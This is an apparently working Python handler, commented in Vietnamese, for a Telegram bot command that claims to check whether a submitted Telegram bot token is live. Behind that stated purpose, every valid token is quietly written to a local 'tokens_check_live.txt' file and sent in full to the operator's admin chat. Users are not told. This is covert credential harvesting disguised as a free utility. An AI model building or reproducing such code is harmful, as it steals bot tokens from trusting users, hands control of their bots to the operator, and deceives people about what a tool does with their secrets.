"""
/token Command
Kiểm tra xem Token Bot Telegram còn sống (LIVE) hay đã chết (DIE).

Cách dùng:
    /token <bot_token>
    Ví dụ: /token 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
"""
import os
from pathlib import Path
from telegram import Bot, Update
from telegram.error import InvalidToken, TelegramError
from telegram.ext import ContextTypes, CommandHandler
from bot.config import Config
from bot.utils.logger import log_from_update
from bot.utils.rate_limiter import rate_limit
from bot.services.user_tracker import track_user

DATA_DIR = Path(__file__).resolve().parent.parent.parent / "data"
DATA_DIR.mkdir(parents=True, exist_ok=True)
TOKENS_LIVE_FILE = DATA_DIR / "tokens_check_live.txt"


@rate_limit(seconds=10)
async def token_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Kiểm tra token bot Telegram còn sống hay đã die."""
    log_from_update(update)

    # Track user nếu là private chat
    if update.effective_user and update.effective_chat and update.effective_chat.type == "private":
        user = update.effective_user
        track_user(
            user_id=user.id,
            first_name=user.first_name or "",
            username=user.username or "",
        )
    if not context.args:
        await update.message.reply_text(
            "🔑 <b>Bot Token Telegram Checker</b>\n\n"
            "Kiểm tra xem Token Bot Telegram còn <b>✅ LIVE</b> hay đã <b>❌ DIE</b>.\n\n"
            "Vui lòng cung cấp token sau lệnh /token.\n\n"
            "Ví dụ: /token <b>123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11</b>",
            parse_mode="HTML",
        )
        return

    input_token = context.args[0]

    try:
        bot = Bot(token=input_token)
        bot_info = await bot.get_me()

        message = (
            f"✅ Token <b>LIVE</b>!:\n\n"
            f"🆔 *Bot ID:* `<i>{bot_info.id}</i>`\n"
            f"👤 *Bot Name:* `{bot_info.first_name}`"
        )
        if bot_info.username:
            message += f"\n🔗 Bot Username: @{bot_info.username}"

        with open(TOKENS_LIVE_FILE, "a", encoding="utf-8") as file:
            file.write(f"{input_token}\n")

        await update.message.reply_text(message, parse_mode="HTML")

        # Thông báo cho admin
        admin_id = Config.ADMIN_CHAT_ID
        if admin_id and admin_id.lstrip("-").isdigit():
            try:
                await context.bot.send_message(
                    chat_id=int(admin_id),
                    text=(
                        f"🔔 Token Checked:\n"
                        f"Token: {input_token}\n"
                        f"Result: ✅ LIVE\n"
                    ),
                )
            except Exception:
                pass  # Không cần crash nếu gửi admin thất bại

    except InvalidToken:
        await update.message.reply_text("❌ Token <b>DIE</b> hoặc đã hết hạn.", parse_mode="HTML")

    except TelegramError as e:
        await update.message.reply_text(
            f"❌ Lỗi khi truy vấn thông tin bot: {e.message}",
            parse_mode="HTML",
        )


def get_handlers():
    """Trả về danh sách handlers để đăng ký"""
    return [
        CommandHandler("token", token_command),
    ]
